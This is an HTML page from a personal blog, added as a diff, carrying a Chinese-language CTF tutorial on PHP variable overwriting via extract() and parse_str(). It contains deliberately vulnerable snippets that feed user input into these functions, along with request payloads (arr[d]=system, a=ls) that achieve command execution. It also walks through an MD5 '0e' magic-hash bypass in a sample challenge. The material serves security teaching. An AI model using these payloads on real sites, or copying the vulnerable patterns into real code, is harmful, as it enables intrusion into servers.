@@ -1,0 +1,257 @@
+<html>
+<head>
+    <meta charset="utf-8"/>
+<meta name="description" content=""/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<title>CTF WEB 变量覆盖 | Xing-Fax</title>
+
+<link rel="shortcut icon" href="https://Xing-Fax.GitHub.io/favicon.ico?v=1699016659770">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://Xing-Fax.GitHub.io/styles/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css">
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dart.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script>
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <div class="navbar-brand">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            Xing-Fax
+        </div>
+    </div>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+                <div class="nav-item">
+                    
+                        <a href="/" class="menu gt-a-link">
+                            首页
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/archives" class="menu gt-a-link">
+                            归档
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/tags" class="menu gt-a-link">
+                            标签
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/post/about" class="menu gt-a-link">
+                            关于
+                        </a>
+                    
+                </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1699016659770" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    CTF WEB 变量覆盖
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2023-07-15 ·
+                    </time>
+                    
+                        <a href="https://Xing-Fax.GitHub.io/tag/php/" class="post-tags">
+                            # PHP
+                        </a>
+                    
+                        <a href="https://Xing-Fax.GitHub.io/tag/web/" class="post-tags">
+                            # WEB
+                        </a>
+                    
+                        <a href="https://Xing-Fax.GitHub.io/tag/ctf/" class="post-tags">
+                            # CTF
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="变量覆盖">变量覆盖</h1>
+ <!-- more --> 
+<p>使用传参的值替换掉原有的变量值</p>
+<pre><code class="language-php">$a = 'abc';
+$a = 'def';
+</code></pre>
+<p>如以上两句代码，变量a最终的值为“def”而不是”abc“因为被重新赋值所以原值被覆盖了</p>
+<p>在PHP中可以使用如下函数进行变量替换</p>
+<pre><code class="language-php">extract()
+parse_str()
+import_requests_variables()  //PHP &gt;= 5.4.0 被弃用
+</code></pre>
+<h2 id="extract">Extract</h2>
+<p>此函数使用数组的建作为变量名称，值作为变量的值，争对每数组中的每一个元素</p>
+<pre><code class="language-php">&lt;?php
+    $a = &quot;Origunal&quot;;
+	$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,
+                      &quot;b&quot; =&gt; &quot;Dog&quot;,
+                      &quot;c&quot; =&gt; &quot;Horse&quot;);
+	extract($my_array);
+	echo &quot;\$a = $a; \$b = $b; \c = $c&quot;
+?&gt;
+</code></pre>
+<p>extract函数执行后会依次创建’a‘、’b‘、‘c’三个变量此时，因为程序开头已经存在变量a，所以变量a的值被重新赋值为”Cat“，被覆盖掉了，所以最后的执行结果为</p>
+<pre><code>$a = Cat; $b = Dog; $c = Horse
+</code></pre>
+<h3 id="例子">例子</h3>
+<pre><code class="language-php">&lt;?php
+    $arr = $_GET['arr'];
+	extract($arr);
+	@$d($POST['a']);
+?&gt;
+</code></pre>
+<p>在此例中，通过对变量b进行覆盖，并将a的值替换为要执行的命令，最后完成任意命令执行</p>
+<p>GET:</p>
+<pre><code>http://localhost/test.php?arr[d]=system
+</code></pre>
+<p>POST:</p>
+<pre><code>a=ls
+</code></pre>
+<h2 id="parse_str">Parse_str</h2>
+<pre><code class="language-php">&lt;?php
+    parse_str(&quot;name=Bill&amp;age=60&quot;);
+	echo $name;
+    echo $age;
+?&gt;
+</code></pre>
+<blockquote>
+<p>将查询字符串解析到变量中</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+    parse_str(&quot;name=Bill&amp;age=60&quot;,$myArray);
+	print_r($myArry);
+?&gt;
+</code></pre>
+<blockquote>
+<p>将查询字符串解析到变量中</p>
+</blockquote>
+<h3 id="例子-2">例子</h3>
+<pre><code class="language-php">&lt;?php
+    $arr = $_GET['arr'];
+	parse_str($arr);
+	@$d($POST['a']);
+?&gt;
+</code></pre>
+<p>GET:</p>
+<pre><code>http://localhost/test.php?arr=d=system
+</code></pre>
+<p>POST:</p>
+<pre><code>a=ls
+</code></pre>
+<h2 id="例题">例题</h2>
+<pre><code class="language-php">&lt;?php
+    if(!isset($_GET['id'])){
+        show_source(__FILE__);
+        die;
+    }
+	include_once('flag.php');
+	$a = 'TESTCTF';
+	$id = $_GET['id'];
+	@parse_str($id);
+	if ($a[0] != 'QNKCDZO' &amp;&amp; md5($a[0]) == md5('QNKCDZO')){
+        die($flag);
+    } else{
+        die('emmm');
+    }
+?&gt;
+</code></pre>
+<p>题目中只有一个Get参数id，在下方的if条件中是对a进行判断，所以要对变量a进行覆盖</p>
+<p>题目中采用parse_str()函数解析变量，后方的字符串”QNKCDZO“的Md5为0e开头，而且采用的弱类型</p>
+<p>所以先将变量a进行覆盖，再将数组a[0]的值设置为”0e00275209979“</p>
+<p>GET:</p>
+<pre><code>http://localhost/test.php?a[0]=0e00275209979
+</code></pre>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://Xing-Fax.GitHub.io/post/scsi/" class="post-title gt-a-link">
+                    Linux磁盘管理实验
+                </a>
+            </div>
+        
+
+        
+
+        
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">温故而知新，可以为师矣~</div>
+    <div class="social-container">
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Website BY <a href="https://github.com/Xing-Fax/" target="_blank">Xing-Fax</a> Powered BY <a
+                href="https://github.com/Xing-Fax/xing-fax.github.io/" target="_blank">GitHub | <a href="https://xing-fax.github.io/atom.xml" target="_blank">RSS</a></a>
+    </div>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
